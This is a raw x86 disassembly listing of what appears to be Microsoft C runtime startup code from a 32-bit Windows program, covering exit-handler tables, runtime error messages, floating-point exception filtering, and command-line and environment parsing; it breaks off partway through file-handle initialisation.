  422d1e:	mov    eax,ds:0x465504
  422d23:	sub    eax,0x4
  422d26:	cmp    eax,ecx
  422d28:	jmp    0x422d40
  422d2a:	mov    eax,DWORD PTR [eax]
  422d2c:	test   eax,eax
  422d2e:	je     0x422d32
  422d30:	call   eax
  422d32:	mov    eax,ds:0x465504
  422d37:	sub    eax,0x4
  422d3a:	cmp    eax,DWORD PTR ds:0x465508
  422d40:	mov    ds:0x465504,eax
  422d45:	jae    0x422d2a
  422d47:	mov    eax,0x42a01c
  422d4c:	mov    esi,0x42a020
  422d51:	cmp    eax,esi
  422d53:	mov    edi,eax
  422d55:	jae    0x422d66
  422d57:	mov    eax,DWORD PTR [edi]
  422d59:	test   eax,eax
  422d5b:	je     0x422d5f
  422d5d:	call   eax
  422d5f:	add    edi,0x4
  422d62:	cmp    edi,esi
  422d64:	jb     0x422d57
  422d66:	mov    eax,0x42a024
  422d6b:	mov    esi,0x42a028
  422d70:	cmp    eax,esi
  422d72:	mov    edi,eax
  422d74:	jae    0x422d85
  422d76:	mov    eax,DWORD PTR [edi]
  422d78:	test   eax,eax
  422d7a:	je     0x422d7e
  422d7c:	call   eax
  422d7e:	add    edi,0x4
  422d81:	cmp    edi,esi
  422d83:	jb     0x422d76
  422d85:	cmp    DWORD PTR [ebp+0x10],0x0
  422d89:	pop    edi
  422d8a:	pop    esi
  422d8b:	je     0x422d96
  422d8d:	push   0x8
  422d8f:	call   0x423a7b
  422d94:	jmp    0x422da8
  422d96:	push   DWORD PTR [ebp+0x8]
  422d99:	mov    DWORD PTR ds:0x464da4,0x1
  422da3:	call   0x422c31
  422da8:	pop    ecx
  422da9:	pop    ebp
  422daa:	ret    
  422dab:	push   0x0
  422dad:	push   0x0
  422daf:	push   DWORD PTR [esp+0xc]
  422db3:	call   0x422cd8
  422db8:	add    esp,0xc
  422dbb:	ret    
  422dbc:	push   0x0
  422dbe:	push   0x1
  422dc0:	push   DWORD PTR [esp+0xc]
  422dc4:	call   0x422cd8
  422dc9:	add    esp,0xc
  422dcc:	ret    
  422dcd:	push   0x1
  422dcf:	push   0x0
  422dd1:	push   0x0
  422dd3:	call   0x422cd8
  422dd8:	add    esp,0xc
  422ddb:	ret    
  422ddc:	push   0x1
  422dde:	push   0x1
  422de0:	push   0x0
  422de2:	call   0x422cd8
  422de7:	add    esp,0xc
  422dea:	ret    
  422deb:	push   ebp
  422dec:	mov    ebp,esp
  422dee:	sub    esp,0x10c
  422df4:	mov    eax,ds:0x4646c0
  422df9:	xor    eax,DWORD PTR [ebp+0x4]
  422dfc:	mov    ecx,DWORD PTR [ebp+0x8]
  422dff:	push   ebx
  422e00:	push   esi
  422e01:	mov    DWORD PTR [ebp-0x4],eax
  422e04:	xor    edx,edx
  422e06:	push   edi
  422e07:	xor    eax,eax
  422e09:	cmp    ecx,DWORD PTR [eax*8+0x464458]
  422e10:	je     0x422e18
  422e12:	inc    eax
  422e13:	cmp    eax,0x12
  422e16:	jb     0x422e09
  422e18:	mov    esi,eax
  422e1a:	shl    esi,0x3
  422e1d:	cmp    ecx,DWORD PTR [esi+0x464458]
  422e23:	jne    0x422f4c
  422e29:	mov    eax,ds:0x464d5c
  422e2e:	cmp    eax,0x1
  422e31:	je     0x422f27
  422e37:	cmp    eax,edx
  422e39:	jne    0x422e48
  422e3b:	cmp    DWORD PTR ds:0x464450,0x1
  422e42:	je     0x422f27
  422e48:	cmp    ecx,0xfc
  422e4e:	je     0x422f4c
  422e54:	push   0x104
  422e59:	lea    eax,[ebp-0x10c]
  422e5f:	push   eax
  422e60:	push   edx
  422e61:	mov    BYTE PTR [ebp-0x8],dl
  422e64:	call   DWORD PTR ds:0x428080
  422e6a:	test   eax,eax
  422e6c:	jne    0x422e81
  422e6e:	lea    eax,[ebp-0x10c]
  422e74:	push   0x4284dc
  422e79:	push   eax
  422e7a:	call   0x423d30
  422e7f:	pop    ecx
  422e80:	pop    ecx
  422e81:	lea    eax,[ebp-0x10c]
  422e87:	push   eax
  422e88:	lea    edi,[ebp-0x10c]
  422e8e:	call   0x423f60
  422e93:	inc    eax
  422e94:	cmp    eax,0x3c
  422e97:	pop    ecx
  422e98:	jbe    0x422ec3
  422e9a:	lea    eax,[ebp-0x10c]
  422ea0:	push   eax
  422ea1:	call   0x423f60
  422ea6:	mov    edi,eax
  422ea8:	lea    eax,[ebp-0x10c]
  422eae:	sub    eax,0x3b
  422eb1:	push   0x3
  422eb3:	add    edi,eax
  422eb5:	push   0x4284d8
  422eba:	push   edi
  422ebb:	call   0x423e30
  422ec0:	add    esp,0x10
  422ec3:	push   edi
  422ec4:	call   0x423f60
  422ec9:	push   DWORD PTR [esi+0x46445c]
  422ecf:	mov    ebx,eax
  422ed1:	call   0x423f60
  422ed6:	lea    eax,[ebx+eax*1+0x1c]
  422eda:	pop    ecx
  422edb:	add    eax,0x3
  422ede:	pop    ecx
  422edf:	and    eax,0xfffffffc
  422ee2:	call   0x4239a0
  422ee7:	mov    ebx,esp
  422ee9:	push   0x4284bc
  422eee:	push   ebx
  422eef:	call   0x423d30
  422ef4:	push   edi
  422ef5:	push   ebx
  422ef6:	call   0x423d40
  422efb:	push   0x4284b8
  422f00:	push   ebx
  422f01:	call   0x423d40
  422f06:	push   DWORD PTR [esi+0x46445c]
  422f0c:	push   ebx
  422f0d:	call   0x423d40
  422f12:	push   0x12010
  422f17:	push   0x428490
  422f1c:	push   ebx
  422f1d:	call   0x423c32
  422f22:	add    esp,0x2c
  422f25:	jmp    0x422f4c
  422f27:	push   edx
  422f28:	lea    eax,[ebp+0x8]
  422f2b:	push   eax
  422f2c:	lea    esi,[esi+0x46445c]
  422f32:	push   DWORD PTR [esi]
  422f34:	call   0x423f60
  422f39:	pop    ecx
  422f3a:	push   eax
  422f3b:	push   DWORD PTR [esi]
  422f3d:	push   0xfffffff4
  422f3f:	call   DWORD PTR ds:0x42807c
  422f45:	push   eax
  422f46:	call   DWORD PTR ds:0x428078
  422f4c:	lea    esp,[ebp-0x118]
  422f52:	mov    ecx,DWORD PTR [ebp-0x4]
  422f55:	xor    ecx,DWORD PTR [ebp+0x4]
  422f58:	call   0x42401c
  422f5d:	pop    edi
  422f5e:	pop    esi
  422f5f:	pop    ebx
  422f60:	leave  
  422f61:	ret    
  422f62:	mov    eax,ds:0x464d5c
  422f67:	cmp    eax,0x1
  422f6a:	je     0x422f79
  422f6c:	test   eax,eax
  422f6e:	jne    0x422f9a
  422f70:	cmp    DWORD PTR ds:0x464450,0x1
  422f77:	jne    0x422f9a
  422f79:	push   0xfc
  422f7e:	call   0x422deb
  422f83:	mov    eax,ds:0x464da8
  422f88:	test   eax,eax
  422f8a:	pop    ecx
  422f8b:	je     0x422f8f
  422f8d:	call   eax
  422f8f:	push   0xff
  422f94:	call   0x422deb
  422f99:	pop    ecx
  422f9a:	ret    
  422f9b:	push   ebp
  422f9c:	mov    ebp,esp
  422f9e:	push   ecx
  422f9f:	push   ebx
  422fa0:	push   esi
  422fa1:	push   edi
  422fa2:	call   0x423803
  422fa7:	mov    edi,DWORD PTR [ebp+0x8]
  422faa:	mov    esi,eax
  422fac:	mov    edx,DWORD PTR [esi+0x54]
  422faf:	mov    eax,ds:0x46456c
  422fb4:	mov    ecx,edx
  422fb6:	cmp    DWORD PTR [ecx],edi
  422fb8:	je     0x422fc7
  422fba:	lea    ebx,[eax+eax*2]
  422fbd:	add    ecx,0xc
  422fc0:	lea    ebx,[edx+ebx*4]
  422fc3:	cmp    ecx,ebx
  422fc5:	jb     0x422fb6
  422fc7:	lea    eax,[eax+eax*2]
  422fca:	lea    eax,[edx+eax*4]
  422fcd:	cmp    ecx,eax
  422fcf:	jae    0x422fd5
  422fd1:	cmp    DWORD PTR [ecx],edi
  422fd3:	je     0x422fd7
  422fd5:	xor    ecx,ecx
  422fd7:	test   ecx,ecx
  422fd9:	je     0x4230f1
  422fdf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fe2:	test   ebx,ebx
  422fe4:	mov    DWORD PTR [ebp+0x8],ebx
  422fe7:	je     0x4230f1
  422fed:	cmp    ebx,0x5
  422ff0:	jne    0x422ffe
  422ff2:	and    DWORD PTR [ecx+0x8],0x0
  422ff6:	xor    eax,eax
  422ff8:	inc    eax
  422ff9:	jmp    0x4230fa
  422ffe:	cmp    ebx,0x1
  423001:	je     0x4230ec
  423007:	mov    eax,DWORD PTR [esi+0x58]
  42300a:	mov    DWORD PTR [ebp-0x4],eax
  42300d:	mov    eax,DWORD PTR [ebp+0xc]
  423010:	mov    DWORD PTR [esi+0x58],eax
  423013:	mov    eax,DWORD PTR [ecx+0x4]
  423016:	cmp    eax,0x8
  423019:	jne    0x4230de
  42301f:	mov    edx,DWORD PTR ds:0x464560
  423025:	mov    eax,ds:0x464564
  42302a:	add    eax,edx
  42302c:	cmp    edx,eax
  42302e:	jge    0x423057
  423030:	lea    eax,[edx+edx*2]
  423033:	shl    eax,0x2
  423036:	mov    edi,DWORD PTR [esi+0x54]
  423039:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42303e:	mov    edi,DWORD PTR ds:0x464560
  423044:	mov    ebx,DWORD PTR ds:0x464564
  42304a:	inc    edx
  42304b:	add    ebx,edi
  42304d:	add    eax,0xc
  423050:	cmp    edx,ebx
  423052:	jl     0x423036
  423054:	mov    ebx,DWORD PTR [ebp+0x8]
  423057:	mov    ecx,DWORD PTR [ecx]
  423059:	cmp    ecx,0xc000008e
  42305f:	mov    edi,DWORD PTR [esi+0x5c]
  423062:	jne    0x42306d
  423064:	mov    DWORD PTR [esi+0x5c],0x83
  42306b:	jmp    0x4230d1
  42306d:	cmp    ecx,0xc0000090
  423073:	jne    0x42307e
  423075:	mov    DWORD PTR [esi+0x5c],0x81
  42307c:	jmp    0x4230d1
  42307e:	cmp    ecx,0xc0000091
  423084:	jne    0x42308f
  423086:	mov    DWORD PTR [esi+0x5c],0x84
  42308d:	jmp    0x4230d1
  42308f:	cmp    ecx,0xc0000093
  423095:	jne    0x4230a0
  423097:	mov    DWORD PTR [esi+0x5c],0x85
  42309e:	jmp    0x4230d1
  4230a0:	cmp    ecx,0xc000008d
  4230a6:	jne    0x4230b1
  4230a8:	mov    DWORD PTR [esi+0x5c],0x82
  4230af:	jmp    0x4230d1
  4230b1:	cmp    ecx,0xc000008f
  4230b7:	jne    0x4230c2
  4230b9:	mov    DWORD PTR [esi+0x5c],0x86
  4230c0:	jmp    0x4230d1
  4230c2:	cmp    ecx,0xc0000092
  4230c8:	jne    0x4230d1
  4230ca:	mov    DWORD PTR [esi+0x5c],0x8a
  4230d1:	push   DWORD PTR [esi+0x5c]
  4230d4:	push   0x8
  4230d6:	call   ebx
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x5c],edi
  4230dc:	jmp    0x4230e5
  4230de:	and    DWORD PTR [ecx+0x8],0x0
  4230e2:	push   eax
  4230e3:	call   ebx
  4230e5:	mov    eax,DWORD PTR [ebp-0x4]
  4230e8:	pop    ecx
  4230e9:	mov    DWORD PTR [esi+0x58],eax
  4230ec:	or     eax,0xffffffff
  4230ef:	jmp    0x4230fa
  4230f1:	push   DWORD PTR [ebp+0xc]
  4230f4:	call   DWORD PTR ds:0x428084
  4230fa:	pop    edi
  4230fb:	pop    esi
  4230fc:	pop    ebx
  4230fd:	leave  
  4230fe:	ret    
  4230ff:	cmp    DWORD PTR ds:0x46550c,0x0
  423106:	jne    0x42310d
  423108:	call   0x42453c
  42310d:	push   esi
  42310e:	mov    esi,DWORD PTR ds:0x465514
  423114:	test   esi,esi
  423116:	jne    0x42311f
  423118:	mov    esi,0x4284f3
  42311d:	jmp    0x423164
  42311f:	mov    al,BYTE PTR [esi]
  423121:	cmp    al,0x22
  423123:	jne    0x42314d
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	je     0x42315d
  42312c:	test   al,al
  42312e:	je     0x423146
  423130:	movzx  eax,al
  423133:	push   eax
  423134:	call   0x42405b
  423139:	test   eax,eax
  42313b:	pop    ecx
  42313c:	je     0x42313f
  42313e:	inc    esi
  42313f:	inc    esi
  423140:	mov    al,BYTE PTR [esi]
  423142:	cmp    al,0x22
  423144:	jne    0x42312c
  423146:	cmp    BYTE PTR [esi],0x22
  423149:	jne    0x42315e
  42314b:	jmp    0x42315d
  42314d:	cmp    al,0x20
  42314f:	jbe    0x42315e
  423151:	inc    esi
  423152:	cmp    BYTE PTR [esi],0x20
  423155:	ja     0x423151
  423157:	jmp    0x42315e
  423159:	cmp    al,0x20
  42315b:	ja     0x423164
  42315d:	inc    esi
  42315e:	mov    al,BYTE PTR [esi]
  423160:	test   al,al
  423162:	jne    0x423159
  423164:	mov    eax,esi
  423166:	pop    esi
  423167:	ret    
  423168:	push   ebx
  423169:	xor    ebx,ebx
  42316b:	cmp    DWORD PTR ds:0x46550c,ebx
  423171:	push   esi
  423172:	push   edi
  423173:	jne    0x42317a
  423175:	call   0x42453c
  42317a:	mov    esi,DWORD PTR ds:0x464d54
  423180:	xor    edi,edi
  423182:	cmp    esi,ebx
  423184:	jne    0x423198
  423186:	jmp    0x4231b8
  423188:	cmp    al,0x3d
  42318a:	je     0x42318d
  42318c:	inc    edi
  42318d:	push   esi
  42318e:	call   0x423f60
  423193:	pop    ecx
  423194:	lea    esi,[esi+eax*1+0x1]
  423198:	mov    al,BYTE PTR [esi]
  42319a:	cmp    al,bl
  42319c:	jne    0x423188
  42319e:	lea    eax,[edi*4+0x4]
  4231a5:	push   eax
  4231a6:	call   0x424672
  4231ab:	mov    edi,eax
  4231ad:	cmp    edi,ebx
  4231af:	pop    ecx
  4231b0:	mov    DWORD PTR ds:0x464d84,edi
  4231b6:	jne    0x4231bd
  4231b8:	or     eax,0xffffffff
  4231bb:	jmp    0x423215
  4231bd:	mov    esi,DWORD PTR ds:0x464d54
  4231c3:	push   ebp
  4231c4:	jmp    0x4231f0
  4231c6:	push   esi
  4231c7:	call   0x423f60
  4231cc:	mov    ebp,eax
  4231ce:	inc    ebp
  4231cf:	cmp    BYTE PTR [esi],0x3d
  4231d2:	pop    ecx
  4231d3:	je     0x4231ee
  4231d5:	push   ebp
  4231d6:	call   0x424672
  4231db:	cmp    eax,ebx
  4231dd:	pop    ecx
  4231de:	mov    DWORD PTR [edi],eax
  4231e0:	je     0x423219
  4231e2:	push   esi
  4231e3:	push   eax
  4231e4:	call   0x423d30
  4231e9:	pop    ecx
  4231ea:	pop    ecx
  4231eb:	add    edi,0x4
  4231ee:	add    esi,ebp
  4231f0:	cmp    BYTE PTR [esi],bl
  4231f2:	jne    0x4231c6
  4231f4:	push   DWORD PTR ds:0x464d54
  4231fa:	call   0x42455a
  4231ff:	mov    DWORD PTR ds:0x464d54,ebx
  423205:	mov    DWORD PTR [edi],ebx
  423207:	mov    DWORD PTR ds:0x465500,0x1
  423211:	xor    eax,eax
  423213:	pop    ecx
  423214:	pop    ebp
  423215:	pop    edi
  423216:	pop    esi
  423217:	pop    ebx
  423218:	ret    
  423219:	push   DWORD PTR ds:0x464d84
  42321f:	call   0x42455a
  423224:	mov    DWORD PTR ds:0x464d84,ebx
  42322a:	or     eax,0xffffffff
  42322d:	jmp    0x423213
  42322f:	push   ebp
  423230:	mov    ebp,esp
  423232:	push   ecx
  423233:	push   ebx
  423234:	mov    ebx,DWORD PTR [ebp+0xc]
  423237:	xor    edx,edx
  423239:	cmp    DWORD PTR [ebp+0x8],edx
  42323c:	push   edi
  42323d:	mov    DWORD PTR [esi],edx
  42323f:	mov    edi,ecx
  423241:	mov    DWORD PTR [ebx],0x1
  423247:	je     0x423252
  423249:	mov    ecx,DWORD PTR [ebp+0x8]
  42324c:	add    DWORD PTR [ebp+0x8],0x4
  423250:	mov    DWORD PTR [ecx],edi
  423252:	cmp    BYTE PTR [eax],0x22
  423255:	jne    0x423265
  423257:	xor    ecx,ecx
  423259:	test   edx,edx
  42325b:	sete   cl
  42325e:	inc    eax
  42325f:	mov    edx,ecx
  423261:	mov    cl,0x22
  423263:	jmp    0x423292
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    cl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],cl
  42326f:	inc    edi
  423270:	mov    cl,BYTE PTR [eax]
  423272:	movzx  ebx,cl
  423275:	inc    eax
  423276:	test   BYTE PTR [ebx+0x4651c1],0x4
  42327d:	je     0x42328b
  42327f:	inc    DWORD PTR [esi]
  423281:	test   edi,edi
  423283:	je     0x42328a
  423285:	mov    bl,BYTE PTR [eax]
  423287:	mov    BYTE PTR [edi],bl
  423289:	inc    edi
  42328a:	inc    eax
  42328b:	test   cl,cl
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	je     0x4232c4
  423292:	test   edx,edx
  423294:	jne    0x423252
  423296:	cmp    cl,0x20
  423299:	je     0x4232a0
  42329b:	cmp    cl,0x9
  42329e:	jne    0x423252
  4232a0:	test   edi,edi
  4232a2:	je     0x4232a8
  4232a4:	and    BYTE PTR [edi-0x1],0x0
  4232a8:	and    DWORD PTR [ebp-0x4],0x0
  4232ac:	cmp    BYTE PTR [eax],0x0
  4232af:	je     0x42338b
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	cmp    cl,0x20
  4232ba:	je     0x4232c1
  4232bc:	cmp    cl,0x9
  4232bf:	jne    0x4232c7
  4232c1:	inc    eax
  4232c2:	jmp    0x4232b5
  4232c4:	dec    eax
  4232c5:	jmp    0x4232a8
  4232c7:	cmp    BYTE PTR [eax],0x0
  4232ca:	je     0x42338b
  4232d0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232d4:	je     0x4232df
  4232d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232d9:	add    DWORD PTR [ebp+0x8],0x4
  4232dd:	mov    DWORD PTR [ecx],edi
  4232df:	inc    DWORD PTR [ebx]
  4232e1:	xor    ebx,ebx
  4232e3:	inc    ebx
  4232e4:	xor    edx,edx
  4232e6:	jmp    0x4232ea
  4232e8:	inc    eax
  4232e9:	inc    edx
  4232ea:	cmp    BYTE PTR [eax],0x5c
  4232ed:	je     0x4232e8
  4232ef:	cmp    BYTE PTR [eax],0x22
  4232f2:	jne    0x42331a
  4232f4:	test   dl,0x1
  4232f7:	jne    0x423318
  4232f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232fd:	je     0x42330b
  4232ff:	lea    ecx,[eax+0x1]
  423302:	cmp    BYTE PTR [ecx],0x22
  423305:	jne    0x42330b
  423307:	mov    eax,ecx
  423309:	jmp    0x42330d
  42330b:	xor    ebx,ebx
  42330d:	xor    ecx,ecx
  42330f:	cmp    DWORD PTR [ebp-0x4],ecx
  423312:	sete   cl
  423315:	mov    DWORD PTR [ebp-0x4],ecx
  423318:	shr    edx,1
  42331a:	test   edx,edx
  42331c:	je     0x42332b
  42331e:	test   edi,edi
  423320:	je     0x423326
  423322:	mov    BYTE PTR [edi],0x5c
  423325:	inc    edi
  423326:	inc    DWORD PTR [esi]
  423328:	dec    edx
  423329:	jne    0x42331e
  42332b:	mov    cl,BYTE PTR [eax]
  42332d:	test   cl,cl
  42332f:	je     0x423379
  423331:	cmp    DWORD PTR [ebp-0x4],0x0
  423335:	jne    0x423341
  423337:	cmp    cl,0x20
  42333a:	je     0x423379
  42333c:	cmp    cl,0x9
  42333f:	je     0x423379
  423341:	test   ebx,ebx
  423343:	je     0x423373
  423345:	test   edi,edi
  423347:	je     0x423362
  423349:	movzx  edx,cl
  42334c:	test   BYTE PTR [edx+0x4651c1],0x4
  423353:	je     0x42335b
  423355:	mov    BYTE PTR [edi],cl
  423357:	inc    edi
  423358:	inc    eax
  423359:	inc    DWORD PTR [esi]
  42335b:	mov    cl,BYTE PTR [eax]
  42335d:	mov    BYTE PTR [edi],cl
  42335f:	inc    edi
  423360:	jmp    0x423371
  423362:	movzx  ecx,cl
  423365:	test   BYTE PTR [ecx+0x4651c1],0x4
  42336c:	je     0x423371
  42336e:	inc    eax
  42336f:	inc    DWORD PTR [esi]
  423371:	inc    DWORD PTR [esi]
  423373:	inc    eax
  423374:	jmp    0x4232e1
  423379:	test   edi,edi
  42337b:	je     0x423381
  42337d:	and    BYTE PTR [edi],0x0
  423380:	inc    edi
  423381:	inc    DWORD PTR [esi]
  423383:	mov    ebx,DWORD PTR [ebp+0xc]
  423386:	jmp    0x4232ac
  42338b:	mov    eax,DWORD PTR [ebp+0x8]
  42338e:	test   eax,eax
  423390:	je     0x423395
  423392:	and    DWORD PTR [eax],0x0
  423395:	inc    DWORD PTR [ebx]
  423397:	pop    edi
  423398:	pop    ebx
  423399:	leave  
  42339a:	ret    
  42339b:	push   ebp
  42339c:	mov    ebp,esp
  42339e:	push   ecx
  42339f:	push   ecx
  4233a0:	push   ebx
  4233a1:	push   esi
  4233a2:	push   edi
  4233a3:	xor    edi,edi
  4233a5:	cmp    DWORD PTR ds:0x46550c,edi
  4233ab:	jne    0x4233b2
  4233ad:	call   0x42453c
  4233b2:	and    BYTE PTR ds:0x464eb4,0x0
  4233b9:	push   0x104
  4233be:	mov    esi,0x464db0
  4233c3:	push   esi
  4233c4:	push   edi
  4233c5:	call   DWORD PTR ds:0x428080
  4233cb:	mov    eax,ds:0x465514
  4233d0:	cmp    eax,edi
  4233d2:	mov    DWORD PTR ds:0x464d94,esi
  4233d8:	je     0x4233e1
  4233da:	cmp    BYTE PTR [eax],0x0
  4233dd:	mov    ebx,eax
  4233df:	jne    0x4233e3
  4233e1:	mov    ebx,esi
  4233e3:	lea    eax,[ebp-0x4]
  4233e6:	push   eax
  4233e7:	push   edi
  4233e8:	lea    esi,[ebp-0x8]
  4233eb:	xor    ecx,ecx
  4233ed:	mov    eax,ebx
  4233ef:	call   0x42322f
  4233f4:	mov    esi,DWORD PTR [ebp-0x4]
  4233f7:	mov    eax,DWORD PTR [ebp-0x8]
  4233fa:	shl    esi,0x2
  4233fd:	add    eax,esi
  4233ff:	push   eax
  423400:	call   0x424672
  423405:	mov    edi,eax
  423407:	add    esp,0xc
  42340a:	test   edi,edi
  42340c:	jne    0x423413
  42340e:	or     eax,0xffffffff
  423411:	jmp    0x423438
  423413:	lea    eax,[ebp-0x4]
  423416:	push   eax
  423417:	lea    ecx,[esi+edi*1]
  42341a:	push   edi
  42341b:	lea    esi,[ebp-0x8]
  42341e:	mov    eax,ebx
  423420:	call   0x42322f
  423425:	mov    eax,DWORD PTR [ebp-0x4]
  423428:	dec    eax
  423429:	pop    ecx
  42342a:	mov    ds:0x464d78,eax
  42342f:	pop    ecx
  423430:	mov    DWORD PTR ds:0x464d7c,edi
  423436:	xor    eax,eax
  423438:	pop    edi
  423439:	pop    esi
  42343a:	pop    ebx
  42343b:	leave  
  42343c:	ret    
  42343d:	push   ecx
  42343e:	push   ecx
  42343f:	mov    eax,ds:0x464eb8
  423444:	push   ebx
  423445:	push   ebp
  423446:	push   esi
  423447:	push   edi
  423448:	mov    edi,DWORD PTR ds:0x428094
  42344e:	xor    ebx,ebx
  423450:	xor    esi,esi
  423452:	cmp    eax,ebx
  423454:	push   0x2
  423456:	pop    ebp
  423457:	jne    0x423486
  423459:	call   edi
  42345b:	mov    esi,eax
  42345d:	cmp    esi,ebx
  42345f:	je     0x42346d
  423461:	mov    DWORD PTR ds:0x464eb8,0x1
  42346b:	jmp    0x42348b
  42346d:	call   DWORD PTR ds:0x428034
  423473:	cmp    eax,0x78
  423476:	jne    0x423481
  423478:	mov    eax,ebp
  42347a:	mov    ds:0x464eb8,eax
  42347f:	jmp    0x423486
  423481:	mov    eax,ds:0x464eb8
  423486:	cmp    eax,0x1
  423489:	jne    0x423508
  42348b:	cmp    esi,ebx
  42348d:	jne    0x423497
  42348f:	call   edi
  423491:	mov    esi,eax
  423493:	cmp    esi,ebx
  423495:	je     0x423510
  423497:	cmp    WORD PTR [esi],bx
  42349a:	mov    eax,esi
  42349c:	je     0x4234ac
  42349e:	add    eax,ebp
  4234a0:	cmp    WORD PTR [eax],bx
  4234a3:	jne    0x42349e
  4234a5:	add    eax,ebp
  4234a7:	cmp    WORD PTR [eax],bx
  4234aa:	jne    0x42349e
  4234ac:	mov    edi,DWORD PTR ds:0x428090
  4234b2:	push   ebx
  4234b3:	push   ebx
  4234b4:	push   ebx
  4234b5:	sub    eax,esi
  4234b7:	push   ebx
  4234b8:	sar    eax,1
  4234ba:	inc    eax
  4234bb:	push   eax
  4234bc:	push   esi
  4234bd:	push   ebx
  4234be:	push   ebx
  4234bf:	mov    DWORD PTR [esp+0x34],eax
  4234c3:	call   edi
  4234c5:	mov    ebp,eax
  4234c7:	cmp    ebp,ebx
  4234c9:	je     0x4234fd
  4234cb:	push   ebp
  4234cc:	call   0x424672
  4234d1:	cmp    eax,ebx
  4234d3:	pop    ecx
  4234d4:	mov    DWORD PTR [esp+0x10],eax
  4234d8:	je     0x4234fd
  4234da:	push   ebx
  4234db:	push   ebx
  4234dc:	push   ebp
  4234dd:	push   eax
  4234de:	push   DWORD PTR [esp+0x24]
  4234e2:	push   esi
  4234e3:	push   ebx
  4234e4:	push   ebx
  4234e5:	call   edi
  4234e7:	test   eax,eax
  4234e9:	jne    0x4234f9
  4234eb:	push   DWORD PTR [esp+0x10]
  4234ef:	call   0x42455a
  4234f4:	pop    ecx
  4234f5:	mov    DWORD PTR [esp+0x10],ebx
  4234f9:	mov    ebx,DWORD PTR [esp+0x10]
  4234fd:	push   esi
  4234fe:	call   DWORD PTR ds:0x42808c
  423504:	mov    eax,ebx
  423506:	jmp    0x423558
  423508:	cmp    eax,ebp
  42350a:	je     0x423514
  42350c:	cmp    eax,ebx
  42350e:	je     0x423514
  423510:	xor    eax,eax
  423512:	jmp    0x423558
  423514:	call   DWORD PTR ds:0x428018
  42351a:	mov    esi,eax
  42351c:	cmp    esi,ebx
  42351e:	je     0x423510
  423520:	cmp    BYTE PTR [esi],bl
  423522:	je     0x42352e
  423524:	inc    eax
  423525:	cmp    BYTE PTR [eax],bl
  423527:	jne    0x423524
  423529:	inc    eax
  42352a:	cmp    BYTE PTR [eax],bl
  42352c:	jne    0x423524
  42352e:	sub    eax,esi
  423530:	inc    eax
  423531:	mov    ebp,eax
  423533:	push   ebp
  423534:	call   0x424672
  423539:	mov    edi,eax
  42353b:	cmp    edi,ebx
  42353d:	pop    ecx
  42353e:	jne    0x423544
  423540:	xor    edi,edi
  423542:	jmp    0x42354f
  423544:	push   ebp
  423545:	push   esi
  423546:	push   edi
  423547:	call   0x424690
  42354c:	add    esp,0xc
  42354f:	push   esi
  423550:	call   DWORD PTR ds:0x428088
  423556:	mov    eax,edi
  423558:	pop    edi
  423559:	pop    esi
  42355a:	pop    ebp
  42355b:	pop    ebx
  42355c:	pop    ecx
  42355d:	pop    ecx
  42355e:	ret    
  42355f:	sub    esp,0x48
  423562:	push   ebx
  423563:	mov    ebx,0x480
  423568:	push   ebx
  423569:	call   0x424672
  42356e:	test   eax,eax
  423570:	pop    ecx
  423571:	jne    0x42357b
  423573:	or     eax,0xffffffff
  423576:	jmp    0x423758
  42357b:	mov    ds:0x465400,eax
  423580:	mov    DWORD PTR ds:0x4653e8,0x20
  42358a:	lea    ecx,[eax+0x480]
  423590:	jmp    0x4235b0
  423592:	and    BYTE PTR [eax+0x4],0x0
  423596:	or     DWORD PTR [eax],0xffffffff
  423599:	and    DWORD PTR [eax+0x8],0x0
  42359d:	mov    BYTE PTR [eax+0x5],0xa
  4235a1:	mov    ecx,DWORD PTR ds:0x465400
  4235a7:	add    eax,0x24
  4235aa:	add    ecx,0x480
  4235b0:	cmp    eax,ecx
  4235b2:	jb     0x423592
  4235b4:	push   ebp
  4235b5:	push   esi
  4235b6:	push   edi
  4235b7:	lea    eax,[esp+0x14]
  4235bb:	push   eax
  4235bc:	call   DWORD PTR ds:0x428060
  4235c2:	cmp    WORD PTR [esp+0x46],0x0
  4235c8:	je     0x4236b7
  4235ce:	mov    eax,DWORD PTR [esp+0x48]
  4235d2:	test   eax,eax
  4235d4:	je     0x4236b7
  4235da:	mov    edi,DWORD PTR [eax]
  4235dc:	lea    ebp,[eax+0x4]
  4235df:	lea    eax,[edi+ebp*1]
  4235e2:	mov    DWORD PTR [esp+0x10],eax
  4235e6:	mov    eax,0x800
  4235eb:	cmp    edi,eax
  4235ed:	jl     0x4235f1
  4235ef:	mov    edi,eax
  4235f1:	cmp    DWORD PTR ds:0x4653e8,edi
  4235f7:	jge    0x423647
  4235f9:	mov    esi,0x465404
  4235fe:	push   ebx
  4235ff:	call   0x424672
  423604:	test   eax,eax
  423606:	pop    ecx
  423607:	je     0x423641
  423609:	add    DWORD PTR ds:0x4653e8,0x20
  423610:	mov    DWORD PTR [esi],eax
  423612:	lea    ecx,[eax+0x480]
  423618:	jmp    0x423630
  42361a:	and    BYTE PTR [eax+0x4],0x0
  42361e:	or     DWORD PTR [eax],0xffffffff
  423621:	and    DWORD PTR [eax+0x8],0x0
  423625:	mov    BYTE PTR [eax+0x5],0xa
  423629:	mov    ecx,DWORD PTR [esi]
  42362b:	add    eax,0x24
  42362e:	add    ecx,ebx
  423630:	cmp    eax,ecx
  423632:	jb     0x42361a
  423634:	add    esi,0x4
  423637:	cmp    DWORD PTR ds:0x4653e8,edi
  42363d:	jl     0x4235fe
  42363f:	jmp    0x423647
  423641:	mov    edi,DWORD PTR ds:0x4653e8
  423647:	xor    ebx,ebx
  423649:	test   edi,edi
  42364b:	jle    0x4236b7
  42364d:	mov    eax,DWORD PTR [esp+0x10]
  423651:	mov    eax,DWORD PTR [eax]
  423653:	cmp    eax,0xffffffff
  423656:	je     0x4236ac
  423658:	mov    cl,BYTE PTR [ebp+0x0]
  42365b:	test   cl,0x1
  42365e:	je     0x4236ac
  423660:	test   cl,0x8
